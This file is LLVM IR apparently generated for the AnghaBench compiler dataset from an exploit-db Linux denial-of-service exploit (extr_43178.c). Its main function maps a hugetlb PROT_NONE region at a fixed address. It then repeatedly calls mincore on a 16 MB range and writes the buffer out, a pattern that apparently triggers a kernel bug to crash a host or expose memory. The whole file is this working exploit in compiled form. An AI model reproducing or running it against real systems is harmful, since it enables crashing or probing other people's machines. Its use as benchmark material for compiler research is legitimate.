; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43178.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43178.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@PROT_NONE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_HUGETLB = common dso_local global i32 0, align 4
@MAP_NORESERVE = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@mcbuf = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"mincore\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %3 = load i32, i32* @PROT_NONE, align 4
  %4 = load i32, i32* @MAP_SHARED, align 4
  %5 = load i32, i32* @MAP_ANONYMOUS, align 4
  %6 = or i32 %4, %5
  %7 = load i32, i32* @MAP_HUGETLB, align 4
  %8 = or i32 %6, %7
  %9 = load i32, i32* @MAP_NORESERVE, align 4
  %10 = or i32 %8, %9
  %11 = call i64 @mmap(i8* inttoptr (i64 1711276032 to i8*), i32 0, i32 %3, i32 %10, i32 -1, i32 0)
  %12 = load i64, i64* @MAP_FAILED, align 8
  %13 = icmp eq i64 %11, %12
  br i1 %13, label %14, label %16

14:                                               ; preds = %0
  %15 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %16

16:                                               ; preds = %14, %0
  store i32 0, i32* %2, align 4
  br label %17

17:                                               ; preds = %29, %16
  %18 = load i32, i32* %2, align 4
  %19 = icmp slt i32 %18, 10000
  br i1 %19, label %20, label %32

20:                                               ; preds = %17
  %21 = load i32, i32* @mcbuf, align 4
  %22 = call i64 @mincore(i8* inttoptr (i64 2248146944 to i8*), i32 16777216, i32 %21)
  %23 = icmp ne i64 %22, 0
  br i1 %23, label %24, label %26

24:                                               ; preds = %20
  %25 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  br label %26

26:                                               ; preds = %24, %20
  %27 = load i32, i32* @mcbuf, align 4
  %28 = call i32 @write(i32 1, i32 %27, i32 4096)
  br label %29

29:                                               ; preds = %26
  %30 = load i32, i32* %2, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %2, align 4
  br label %17

32:                                               ; preds = %17
  %33 = load i32, i32* %1, align 4
  ret i32 %33
}

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i64 @mincore(i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
